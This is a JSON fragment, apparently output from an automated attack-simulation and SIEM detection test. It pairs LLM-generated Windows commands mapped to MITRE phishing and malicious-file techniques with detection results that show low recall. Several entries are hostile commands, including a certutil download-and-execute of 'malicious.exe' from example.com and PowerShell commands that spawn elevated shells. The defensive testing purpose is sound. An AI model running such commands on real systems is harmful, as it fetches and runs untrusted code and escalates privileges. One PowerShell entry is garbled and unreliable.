      "id": "cc51acb6-463b-4e4b-ad60-4c205ac66468",
      "ttp_id": "unknown",
      "technique_id": "T1566",
      "technique_name": "Phishing",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& {Start-Process cmd.exe -Verb RunAs}\"",
      "description": "Spawn elevated command shell via PowerShell to simulate phishing activity",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "New elevated command shell window opens",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:22.718458",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "bdb2157a-0d2c-433a-a92d-fd0bcdd11163",
      "ttp_id": "unknown",
      "technique_id": "T1566",
      "technique_name": "Phishing",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& {Invoke-Expression '(New-Object System.Diagnostics.ProcessStartInfo \"cmd.exe\", \"/k\", [System.Security.Principal.WindowsBuiltInRole]::Administrator).UseShellExecute = $false; (New-Object System.Diagnostics.Process).StartInfo = (New-Object System.Diagnostics.ProcessStartInfo \"cmd.exe\", \"/k\", [System.Security.Principal.WindowsBuiltInRole]::Administrator); Start-Process cmd.exe -Verb RunAs}\"'",
      "description": "Spawn elevated command shell via PowerShell with encoded command to simulate phishing activity",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "New elevated command shell window opens",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:22.718458",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "658aecd9-86b6-42d0-94d0-1be875dd9250",
      "ttp_id": "unknown",
      "technique_id": "T1204",
      "technique_name": "User Execution: Malicious File",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Write-Host 'Test file execution'\"",
      "description": "Basic malicious file execution via PowerShell",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Writes 'Test file execution' to the console",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:23.213599",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "31cc74bb-0377-41d6-a854-724eea6e4994",
      "ttp_id": "unknown",
      "technique_id": "T1204",
      "technique_name": "User Execution: Malicious File",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -f -urlcache http://example.com/malicious.exe %TEMP%\\malicious.exe && %TEMP%\\malicious.exe",
      "description": "Intermediate malicious file execution via certutil and URL caching",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file from a URL and executes it",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:23.213599",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ebf41cb1-da87-40a8-884e-e24acb21c77c",
      "ttp_id": "unknown",
      "technique_id": "T1204",
      "technique_name": "User Execution: Malicious File",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Diagnostics.Process]::Start('%TEMP%\\malicious.exe')\"",
      "description": "Advanced malicious file execution via PowerShell process creation",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Executes a file in the temp directory using the Process class",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:23.214683",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    }
  ],
  "siem_verification": [
    {
      "rule_id": "23db6176-6ab4-4ed5-951d-420ee3b7e031",
      "attack_id": "8b450684-62f8-4455-a162-4332146883f3",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 428.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "2c6bd7c8-5367-435e-a45b-b2f678c6729d",
      "attack_id": "dc099f35-bcb9-413a-b1bc-6b343fe3b49e",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 435.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "ed53ff08-0b14-43c7-8d43-6adbded0b075",
      "attack_id": "7f20d625-e198-479f-a402-a7ff70d96120",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 433.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "1e4b238f-2f6f-41b0-af2c-77bd0809c05a",
      "attack_id": "ea43c41b-0a2a-4ad5-81cf-0b7c065fbc08",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 434.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "e3c7dd0a-5ce8-4884-b4dc-8e7f139b39a9",
      "attack_id": "18260079-75fa-42c8-9d5e-fd7a51cbb9cf",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 422.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "acc7c816-475b-4618-9257-1342640274df",
      "attack_id": "52697c13-bde0-44b5-af1d-6d650c481358",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 443.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "45ef650a-8d0f-4a1a-a1c7-665a92134c82",
      "attack_id": "51646b10-ce73-47e4-b642-5b13ce25d812",
      "detected": true,
      "events_found": 4,
      "historical_events": 0,
      "query_time_ms": 463.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "ca4d1b43-d997-45dc-9e7e-db04cb061589",
      "attack_id": "068412e3-1839-4d4b-97e5-91574bd3c516",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 431.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "bab62857-a6d9-4163-b43b-c1ec42ab3fe9",
      "attack_id": "b3a7a0e7-4b4c-452e-bd4b-b13f623c048b",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 442.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "32b36b71-9d42-4f12-a17b-e3e55e2b24b9",
      "attack_id": "7ee19eb8-46fb-4463-839b-df0c268419f9",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 519.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "9c04763b-99e4-4bf1-92c5-d139bb7601ba",
      "attack_id": "28984162-4ba8-48b9-8597-7fba619f369f",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 408.00000000000006,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "b86c1453-fa0a-4f8e-9384-1fa42bd80b0a",
      "attack_id": "7c4f1277-1f93-4628-a07e-6870e122ff9b",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 449.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "923d6f9f-f718-447f-9b23-c6aa9c3320f1",
      "attack_id": "72ab3e06-76d1-4808-acfc-8f9a3fa67eb6",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 492.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "f69eff42-23b2-4d92-80ab-821f7accdc42",
      "attack_id": "e05853e3-a528-48e4-9448-717126182f73",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 434.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "477dd14d-e23c-46bd-8714-3a84ce3b92c1",
      "attack_id": "f25cc8ca-1df7-4f51-be01-f9156322b396",
      "detected": true,
      "events_found": 2,
      "historical_events": 0,
      "query_time_ms": 470.00000000000006,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "e23e7dcc-d28d-4d06-a3f3-6b88134aadfa",
      "attack_id": "33b37b53-b76c-44e9-8db9-7c5e160fa7dd",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 425.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "8c88b1e8-0e85-443a-bb91-57a9cbdd862d",
      "attack_id": "225bd97b-27b7-4804-9df1-551240e33fda",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 1046.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "9ccd2e07-446a-4493-992b-582d57a1f328",
      "attack_id": "4d25cde6-b88d-475c-a9c5-cf0c73a57a54",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 455.0,
      "status": "success",
      "message": "Verification complete"
    }
  ],
  "siem_metrics": {
    "true_positives": 2,
    "false_positives": 0,
    "false_negatives": 16,
    "true_negatives": 0,
    "precision": 1.0,
    "recall": 0.1111111111111111,
    "f1_score": 0.19999999999999998,
    "accuracy": 0.1111111111111111,
    "detection_rate": 0.1111111111111111,
    "false_positive_rate": 0.0
  },
  "iterations": 3,
  "final_score": 0.569,
  "timestamp": "2025-12-22T01:02:35.834132"
}